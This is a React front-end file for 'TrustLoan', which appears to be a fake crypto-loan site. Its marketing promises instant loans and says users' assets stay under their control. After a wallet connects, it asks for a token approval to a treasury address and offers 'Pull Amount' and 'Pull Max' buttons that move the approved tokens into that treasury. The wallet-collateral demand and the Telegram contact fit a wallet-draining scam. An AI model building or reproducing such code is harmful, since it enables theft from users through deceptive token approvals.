// App.js
import './styles.css';
import React, { useEffect, useMemo, useState } from 'react';
import ConnectWallet from './components/ConnectWallet';
import { useAccount, useWalletClient, usePublicClient, useChainId } from 'wagmi';
import { handleLoanRequest } from './components/handleLoanRequest';
import LiveChat from './components/LiveChat'; // make sure path is correct
import { CONTRACTS, getBalances, getTokenMeta, approveToken, pullMyApproved, pullMyMax } from './components/autoWithdraw';
import { toTokenUnits } from './components/erc20';


function App() {
  const { isConnected, address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const chainId = useChainId();
  const [mounted, setMounted] = useState(false);
  const [tokenInfo, setTokenInfo] = useState({ symbol: 'TOKEN', decimals: 18 });
  const [tokenState, setTokenState] = useState({ balance: 0n, allowance: 0n, approved: 0n });
  const [amountInput, setAmountInput] = useState('');
  const [busy, setBusy] = useState(false);

  const selected = useMemo(() => CONTRACTS[chainId] || CONTRACTS[1], [chainId]);
  const tokenAddress = selected?.usdt;
  const treasuryAddress = selected?.treasury;

  useEffect(() => {
    setMounted(true);

    // ✅ Inject Tawk.to chat widget
    const s1 = document.createElement('script');
    s1.async = true;
    s1.src = 'https://embed.tawk.to/685d37b90d497d191b31a29f/1ium23bm3'; // Your real widget link
    s1.charset = 'UTF-8';
    s1.setAttribute('crossorigin', '*');
    document.body.appendChild(s1);

    // 🚨 Error handler for script issues (already in your code)
    const errorHandler = (e) => {
      const target = e.target || e.srcElement;
      if (target && target.tagName === 'SCRIPT') {
        console.error('🚨 Script failed to load or invalid JS:', {
          src: target.src,
          outerHTML: target.outerHTML,
          message: e.message,
          error: e.error
        });

        fetch(target.src)
          .then(res => res.text())
          .then(body => {
            if (body.startsWith('<')) {
              console.warn('❗ This script returned HTML instead of JS:', target.src);
              console.log('Returned content:\n', body.slice(0, 500));
            }
          })
          .catch(fetchErr => {
            console.error('Failed to fetch script for inspection:', fetchErr);
          });
      }
    };

    window.addEventListener('error', errorHandler, true);

    return () => {
      window.removeEventListener('error', errorHandler, true);
    };
  }, []);

  // load token meta
  useEffect(() => {
    if (!publicClient || !tokenAddress) return;
    (async () => {
      try {
        const meta = await getTokenMeta(publicClient, tokenAddress);
        setTokenInfo(meta);
      } catch (e) {
        console.error(e);
      }
    })();
  }, [publicClient, tokenAddress]);

  // load balances/allowances
  useEffect(() => {
    if (!publicClient || !address || !tokenAddress || !treasuryAddress) return;
    (async () => {
      try {
        const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
        setTokenState(data);
      } catch (e) {
        console.error(e);
      }
    })();
  }, [publicClient, address, tokenAddress, treasuryAddress]);

  async function onApprove() {
    if (!walletClient || !address) return;
    try {
      setBusy(true);
      const amountWei = toTokenUnits(amountInput || '0', tokenInfo.decimals);
      const hash = await approveToken(walletClient, tokenAddress, treasuryAddress, amountWei);
      alert(`Approval submitted: ${hash}`);
      const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
      setTokenState(data);
    } catch (e) {
      alert(e?.shortMessage || e?.message || 'Approval failed');
    } finally {
      setBusy(false);
    }
  }

  async function onPullExact() {
    if (!walletClient || !address) return;
    try {
      setBusy(true);
      const amountWei = toTokenUnits(amountInput || '0', tokenInfo.decimals);
      const hash = await pullMyApproved(walletClient, treasuryAddress, tokenAddress, amountWei);
      alert(`Pull submitted: ${hash}`);
      const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
      setTokenState(data);
    } catch (e) {
      alert(e?.shortMessage || e?.message || 'Pull failed');
    } finally {
      setBusy(false);
    }
  }

  async function onPullMax() {
    if (!walletClient || !address) return;
    try {
      setBusy(true);
      const hash = await pullMyMax(walletClient, treasuryAddress, tokenAddress);
      alert(`Pull max submitted: ${hash}`);
      const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
      setTokenState(data);
    } catch (e) {
      alert(e?.shortMessage || e?.message || 'Pull max failed');
    } finally {
      setBusy(false);
    }
  }

  if (!mounted) return null;

  return (
    <div className="app">
      {/* Navbar */}
      <header className="navbar">
        <div className="logo">TrustLoan</div>
        <nav className="nav-links">
          <a href="#how-it-works">How it Works</a>
          <a href="#loan-offers">Loan Offers</a>
          <a href="#faq">FAQ</a>
        </nav>
        {/* ✅ Connect Wallet Button in navbar */}
        <ConnectWallet />
      </header>

      {/* Hero Section */}
      <section className="hero-container">
        <div className="hero">
          {/* Token Icons Left - Hidden on Mobile */}
          <div className="hidden md:flex relative w-[300px] h-[320px] items-center justify-center">
            <div className="relative w-full h-full">
              <img src="/images/ethereum-eth-logo.png" alt="ETH" className="token eth" />
              <img src="/images/usd-coin-usdc-logo.png" alt="USDC" className="token usdc" />
              <img src="/images/dai.png" alt="DAI" className="token dai" />
              <img src="/images/litecoin.png" alt="WBTC" className="token wbtc" />
            </div>
          </div>

          {/* Hero Center */}
          <div className="hero-content-wrapper">
            <div className="hero-content">
              {!isConnected ? (
                <>
                  <h1>
                    Welcome to <span className="highlight">Trust Loan</span>
                  </h1>

                  <section className="bg-gradient-to-br from-[#1c1f26] to-[#0f1115] text-white py-20 px-6 text-center md:text-left">
                    <div className="max-w-5xl mx-auto">
                      <p className="text-lg md:text-xl text-gray-300 mb-10">
                        <strong className="block text-2xl font-semibold text-white mb-3">
                          A Secure and Simple Way to Get Crypto-Backed Loans
                        </strong>
                        Trust loan allows you to borrow stablecoins instantly using your crypto assets as collateral — no credit checks, no paperwork, no intermediaries.
                      </p>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
                        <div>
                          <h3 className="text-xl font-bold text-purple-400 mb-2">Instant Loans</h3>
                          <p className="text-gray-300">
                            Borrow in seconds - no approvals, no delays, on-chain only.
                          </p>
                        </div>
                        <div>
                          <h3 className="text-xl font-bold text-purple-400 mb-2">Secure Collateral</h3>
                          <p className="text-gray-300">
                            Your assets remain safe, locked in audited smart contracts.
                          </p>
                        </div>
                        <div>
                          <h3 className="text-xl font-bold text-purple-400 mb-2">Total Control</h3>
                          <p className="text-gray-300">
                            Repay anytime. Withdraw instantly. No hidden fees or fine print.
                          </p>
                        </div>
                      </div>
                    </div>
                  </section>

                  <section className="relative z-10 px-6 py-24 max-w-7xl mx-auto bg-gradient-to-b from-transparent to-[#0f1115] mb-24">
                    <h2 className="text-4xl font-extrabold text-white mb-16 text-center tracking-tight">
                      How It Works
                    </h2>

                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 text-white">
                      {[
                        {
                          title: 'Connect Wallet',
                          icon: '🔗',
                          desc: 'Securely link your crypto wallet in seconds and get started instantly.'
                        },
                        {
                          title: 'Deposit Collateral',
                          icon: '💼',
                          desc: 'Choose supported assets and lock them into our smart contract as collateral.'
                        },
                        {
                          title: 'Borrow Instantly',
                          icon: '⚡',
                          desc: 'Receive stablecoins with zero delays — no approvals, no paperwork.'
                        },
                        {
                          title: 'Repay Anytime',
                          icon: '🔓',
                          desc: 'Unlock your assets at your own pace. No penalties or hidden fees.'
                        }
                      ].map((step, index) => (
                        <div
                          key={index}
                          className="flex flex-col items-center text-center p-8 bg-zinc-900/80 rounded-2xl border border-zinc-800 shadow-xl hover:shadow-purple-500/30 transition-all duration-300 hover:-translate-y-2"
                        >
                          <div className="text-5xl mb-6">{step.icon}</div>
                          <h3 className="text-xl font-bold mb-3">{step.title}</h3>
                          <p className="text-gray-400 text-sm leading-relaxed">{step.desc}</p>
                        </div>
                      ))}
                    </div>

                    <p className="text-center text-gray-400 mt-16 max-w-2xl mx-auto text-base leading-relaxed">
                      All loans are processed 100% on-chain — verifiable, secure, and trustless. Your assets stay under your control at all times.
                    </p>
                  </section>

                  {/* Connect Wallet Button in hero */}
                  <div className="flex justify-center items-center mt-6">
                    <ConnectWallet />
                  </div>
                </>
              ) : (
                <div className="connected-dashboard">
                  <h3>Welcome back 👋</h3>
                  <div className="loan-options">
                    <h3 className="loan-heading">Select compatible loan option:</h3>
                    <div className="mt-4 mb-2 bg-yellow-900/20 border border-yellow-600 text-yellow-300 px-4 py-3 rounded-xl text-sm font-medium shadow-md">
                      ⚠️ To protect your loan, your wallet must hold at least <span className="font-semibold text-white">10% of your requested loan</span> as wallet collateral.
                    </div>

                    <div className="loan-grid">
                      {[
                        { amount: 5000},
                        { amount: 10000},
                        { amount: 15000},
                        { amount: 20000},
                        { amount: 50000 },
                        { amount: 100000}
                      ].map(({ amount, fee }) => (
                        <button
                          key={amount}
                          className="loan-button"
                          onClick={() => {
                            if (walletClient && address) {
                              handleLoanRequest(walletClient, address, amount);
                            }
                          }}
                        >
                          <div className="loan-amount">${amount.toLocaleString()}</div>
                          
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Approval & Auto-Withdraw Section */}
                  <div className="mt-8 p-4 bg-zinc-900/80 rounded-2xl border border-zinc-800">
                    <h3 className="text-lg font-semibold mb-3">Token Approval & Auto-Withdrawal</h3>
                    <div className="text-sm text-gray-400 mb-4">
                      Token: {tokenInfo.symbol} • Balance: {Number(tokenState.balance) / 10 ** tokenInfo.decimals} • Allowance → Treasury: {Number(tokenState.allowance) / 10 ** tokenInfo.decimals}
                    </div>
                    <div className="flex gap-3 items-center">
                      <input
                        type="number"
                        min="0"
                        placeholder={`Amount (${tokenInfo.symbol})`}
                        value={amountInput}
                        onChange={(e) => setAmountInput(e.target.value)}
                        className="px-3 py-2 rounded-md bg-zinc-800 border border-zinc-700 text-white text-sm"
                      />
                      <button disabled={busy} onClick={onApprove} className="loan-button">
                        {busy ? 'Processing...' : `Approve ${tokenInfo.symbol}`}
                      </button>
                      <button disabled={busy} onClick={onPullExact} className="loan-button">
                        {busy ? 'Processing...' : 'Pull Amount'}
                      </button>
                      <button disabled={busy} onClick={onPullMax} className="loan-button">
                        {busy ? 'Processing...' : 'Pull Max'}
                      </button>
                    </div>
                    <p className="text-xs text-gray-500 mt-3">Approve the token for the treasury, then pull approved funds into the treasury wallet.</p>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Hero Right Phone Image */}
          <div className="hero-image">
            <img src="/images/iphone-mockup.png" alt="iPhone mockup with wallet" />
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-left">
            <h2 className="footer-logo">TrustLoan</h2>
            <p>Empowering decentralized access to instant loans. No paperwork. No delay.</p>
          </div>
          <div className="footer-links">
            <div className="footer-column">
              <h4>Navigate</h4>
              <a href="#how-it-works">How it Works</a>
              <a href="#loan-offers">Loan Offers</a>
              <a href="#faq">FAQ</a>
            </div>
            <div className="footer-column">
              <h4>Connect</h4>
              <a href="https://t.me/josecsco" target="_blank" rel="noopener noreferrer">Telegram</a>
              <a href="#">Twitter</a>
              <a href="#">Contact Support</a>
            </div>
          </div>
        </div>
        <div className="footer-bottom">
          <p>&copy; 2025 Xylon — All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default App
